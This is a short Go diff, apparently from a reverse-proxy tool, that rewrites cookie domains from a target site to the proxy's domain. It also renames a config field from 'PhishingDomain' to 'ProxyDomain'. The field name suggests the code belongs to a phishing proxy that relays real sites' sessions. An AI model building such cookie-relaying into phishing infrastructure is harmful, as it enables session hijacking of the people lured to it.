@@ -792,7 +792,7 @@ func init() {
 				if cookies[i].Domain == "" {
 					td := strings.Replace(*config.C.Target, "http://", "", -1)
 					td = strings.Replace(td, "https://", "", -1)
-					t := strings.Replace(context.Target.Host, td, *config.C.PhishingDomain, -1)
+					t := strings.Replace(context.Target.Host, td, *config.C.ProxyDomain, -1)
 					cookies[i].Domain = t
 				}
 
